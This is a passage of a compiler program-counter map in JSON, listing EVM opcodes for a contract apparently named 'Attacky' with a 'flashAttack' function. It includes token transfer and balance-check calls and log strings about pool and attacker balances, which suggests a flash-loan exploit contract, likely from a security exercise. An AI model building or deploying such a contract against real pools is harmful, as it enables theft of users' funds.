    },
    "734": {
      "op": "SHL"
    },
    "735": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP2",
      "path": "14"
    },
    "736": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "737": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1167,
        1171
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "770": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "772": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "774": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "776": {
      "op": "SHL"
    },
    "777": {
      "op": "SUB"
    },
    "778": {
      "op": "DUP2"
    },
    "779": {
      "op": "DUP2"
    },
    "780": {
      "op": "AND"
    },
    "781": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "783": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP5",
      "path": "14"
    },
    "784": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "ADD",
      "path": "14"
    },
    "785": {
      "op": "MSTORE"
    },
    "786": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1145
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "819": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1158
      ],
      "op": "AND",
      "path": "14"
    },
    "820": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1158
      ],
      "op": "SWAP4",
      "path": "14"
    },
    "821": {
      "op": "POP"
    },
    "822": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1158
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x23B872DD"
    },
    "827": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1158
      ],
      "op": "SWAP3",
      "path": "14"
    },
    "828": {
      "op": "POP"
    },
    "829": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1167,
        1171
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "830": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1174,
        1184
      ],
      "op": "CALLER",
      "path": "14"
    },
    "831": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1174,
        1184
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "832": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1158
      ],
      "op": "DUP5",
      "path": "14"
    },
    "833": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1158
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "834": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1202
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x70A08231"
    },
    "839": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1202
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "840": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "842": {
      "op": "ADD"
    },
    "843": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "845": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "847": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "848": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP1",
      "path": "14"
    },
    "849": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP4",
      "path": "14"
    },
    "850": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "SUB",
      "path": "14"
    },
    "851": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP2",
      "path": "14"
    },
    "852": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP7",
      "path": "14"
    },
    "853": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "GAS",
      "path": "14"
    },
    "854": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "STATICCALL",
      "path": "14"
    },
    "855": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "856": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP1",
      "path": "14"
    },
    "857": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "858": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x367"
    },
    "861": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "862": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "863": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "865": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP1",
      "path": "14"
    },
    "866": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "RETURNDATACOPY",
      "path": "14"
    },
    "867": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "868": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "870": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "REVERT",
      "path": "14"
    },
    "871": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "872": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "POP",
      "path": "14"
    },
    "873": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "POP",
      "path": "14"
    },
    "874": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "POP",
      "path": "14"
    },
    "875": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "POP",
      "path": "14"
    },
    "876": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "878": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "879": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "880": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "882": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "NOT",
      "path": "14"
    },
    "883": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "885": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP3",
      "path": "14"
    },
    "886": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "ADD",
      "path": "14"
    },
    "887": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "AND",
      "path": "14"
    },
    "888": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP3",
      "path": "14"
    },
    "889": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "ADD",
      "path": "14"
    },
    "890": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP1",
      "path": "14"
    },
    "891": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "893": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "894": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "POP",
      "path": "14"
    },
    "895": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "DUP2",
      "path": "14"
    },
    "896": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "ADD",
      "path": "14"
    },
    "897": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "898": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x38B"
    },
    "901": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "902": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "903": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x58A"
    },
    "906": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        1186,
        1217
      ],
      "op": "JUMP",
      "path": "14"
    },
    "907": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "908": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "910": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "911": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "913": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "915": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "917": {
      "op": "SHL"
    },
    "918": {
      "op": "SUB"
    },
    "919": {
      "op": "NOT"
    },
    "920": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0xE0"
    },
    "922": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP7",
      "path": "14"
    },
    "923": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "924": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "SHL",
      "path": "14"
    },
    "925": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "AND",
      "path": "14"
    },
    "926": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP2",
      "path": "14"
    },
    "927": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "928": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "930": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "932": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "934": {
      "op": "SHL"
    },
    "935": {
      "op": "SUB"
    },
    "936": {
      "op": "SWAP4"
    },
    "937": {
      "op": "DUP5"
    },
    "938": {
      "op": "AND"
    },
    "939": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "941": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP3",
      "path": "14"
    },
    "942": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "ADD",
      "path": "14"
    },
    "943": {
      "op": "MSTORE"
    },
    "944": {
      "op": "SWAP3"
    },
    "945": {
      "op": "SWAP1"
    },
    "946": {
      "op": "SWAP2"
    },
    "947": {
      "op": "AND"
    },
    "948": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "950": {
      "op": "DUP4"
    },
    "951": {
      "op": "ADD"
    },
    "952": {
      "op": "MSTORE"
    },
    "953": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "955": {
      "op": "DUP3"
    },
    "956": {
      "op": "ADD"
    },
    "957": {
      "op": "MSTORE"
    },
    "958": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "960": {
      "op": "ADD"
    },
    "961": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "963": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "965": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "966": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP1",
      "path": "14"
    },
    "967": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP4",
      "path": "14"
    },
    "968": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "SUB",
      "path": "14"
    },
    "969": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP2",
      "path": "14"
    },
    "970": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "972": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP8",
      "path": "14"
    },
    "973": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "GAS",
      "path": "14"
    },
    "974": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "CALL",
      "path": "14"
    },
    "975": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "976": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP1",
      "path": "14"
    },
    "977": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "978": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x3DF"
    },
    "981": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "982": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "983": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "985": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP1",
      "path": "14"
    },
    "986": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "RETURNDATACOPY",
      "path": "14"
    },
    "987": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "988": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "990": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "REVERT",
      "path": "14"
    },
    "991": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "992": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "POP",
      "path": "14"
    },
    "993": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "POP",
      "path": "14"
    },
    "994": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "POP",
      "path": "14"
    },
    "995": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "POP",
      "path": "14"
    },
    "996": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "998": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "999": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "1000": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "1002": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "NOT",
      "path": "14"
    },
    "1003": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "1005": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1006": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "ADD",
      "path": "14"
    },
    "1007": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "AND",
      "path": "14"
    },
    "1008": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1009": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "ADD",
      "path": "14"
    },
    "1010": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP1",
      "path": "14"
    },
    "1011": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "1013": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1014": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "POP",
      "path": "14"
    },
    "1015": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "DUP2",
      "path": "14"
    },
    "1016": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "ADD",
      "path": "14"
    },
    "1017": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1018": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x403"
    },
    "1021": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "1022": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1023": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x625"
    },
    "1026": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        1139,
        1218
      ],
      "op": "JUMP",
      "path": "14"
    },
    "1027": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1139,
        1218
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "1028": {
      "op": "POP"
    },
    "1029": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "PUSH1",
      "path": "14",
      "statement": 3,
      "value": "0x40"
    },
    "1031": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "DUP1",
      "path": "14"
    },
    "1032": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "1033": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "DUP1",
      "path": "14"
    },
    "1034": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1035": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "ADD",
      "path": "14"
    },
    "1036": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1037": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1038": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x14"
    },
    "1040": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "DUP2",
      "path": "14"
    },
    "1041": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1042": {
      "op": "PUSH20",
      "value": "0x2837B7B6103130B630B731B29020A32A22A91D1"
    },
    "1063": {
      "op": "PUSH1",
      "value": "0x65"
    },
    "1065": {
      "op": "SHL"
    },
    "1066": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "1068": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1069": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "ADD",
      "path": "14"
    },
    "1070": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1071": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1072": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "1073": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1078": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1080": {
      "op": "SHL"
    },
    "1081": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "DUP2",
      "path": "14"
    },
    "1082": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1083": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1085": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1087": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1089": {
      "op": "SHL"
    },
    "1090": {
      "op": "SUB"
    },
    "1091": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1288,
        1292
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "1124": {
      "op": "DUP2"
    },
    "1125": {
      "op": "AND"
    },
    "1126": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "1128": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "DUP4",
      "path": "14"
    },
    "1129": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "ADD",
      "path": "14"
    },
    "1130": {
      "op": "MSTORE"
    },
    "1131": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x4A2"
    },
    "1134": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "SWAP3",
      "path": "14"
    },
    "1135": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "1136": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1269
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "1169": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1279
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1170": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1279
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "1171": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1279
      ],
      "op": "AND",
      "path": "14"
    },
    "1172": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1279
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1173": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1279
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x70A08231"
    },
    "1178": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1279
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1179": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1181": {
      "op": "ADD"
    },
    "1182": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1263,
        1294
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x10F"
    },
    "1185": {
      "op": "JUMP"
    },
    "1186": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1228,
        1295
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "1187": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "PUSH1",
      "path": "14",
      "statement": 4,
      "value": "0x40"
    },
    "1189": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "DUP1",
      "path": "14"
    },
    "1190": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "1191": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "DUP1",
      "path": "14"
    },
    "1192": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1193": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "ADD",
      "path": "14"
    },
    "1194": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1195": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1196": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x12"
    },
    "1198": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "DUP2",
      "path": "14"
    },
    "1199": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1200": {
      "op": "PUSH18",
      "value": "0x20BA3A30B1B5B2B9103130B630B731B29D1"
    },
    "1219": {
      "op": "PUSH1",
      "value": "0x75"
    },
    "1221": {
      "op": "SHL"
    },
    "1222": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "1224": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1225": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "ADD",
      "path": "14"
    },
    "1226": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1227": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1228": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "1229": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1234": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1236": {
      "op": "SHL"
    },
    "1237": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "DUP2",
      "path": "14"
    },
    "1238": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "1239": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1554,
        1564
      ],
      "op": "CALLER",
      "path": "14"
    },
    "1240": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "1242": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "DUP3",
      "path": "14"
    },
    "1243": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "ADD",
      "path": "14"
    },
    "1244": {
      "op": "MSTORE"
    },
    "1245": {
